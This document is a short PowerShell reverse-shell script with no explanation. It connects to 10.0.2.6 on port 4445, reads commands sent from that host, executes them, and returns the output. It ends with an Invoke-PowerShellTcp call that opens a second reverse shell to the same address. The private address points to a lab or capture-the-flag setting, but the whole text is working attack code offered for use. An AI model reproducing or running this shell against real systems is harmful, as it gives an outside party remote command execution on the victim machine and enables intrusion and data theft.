$socket = new-object System.Net.Sockets.TcpClient('10.0.2.6', 4445);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("> ");
	$writer.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split(' ')
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $writer.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$writer.close();$socket.close();
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.6 -Port 4445
